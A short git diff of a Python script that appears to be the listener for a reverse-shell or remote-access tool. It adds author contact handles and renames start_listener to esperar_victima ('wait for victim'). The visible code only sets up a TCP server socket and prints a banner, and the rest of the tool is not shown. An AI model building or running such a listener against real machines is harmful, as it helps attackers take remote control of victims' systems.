@@ -1,3 +1,6 @@
+# Github   : Valengamerr
+# Telegram : Valen_Qq
+# Discord  : uknowuser_qq
 import socket
 
 
@@ -16,7 +19,7 @@ BANNER = rf"""
 {P2}      #+#     #+#   #+#+# #+#    #+#    #+#    #+#    #+#    #+#     #+#     #+#      
 {W}  ########### ###    #### ######### ########### ######## ########### ###     ### 
 """
-def start_listener():
+def esperar_victima():
     print(BANNER)
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -61,4 +64,4 @@ def start_listener():
             break
 
 if __name__ == "__main__":
-    start_listener()
+    esperar_victima()
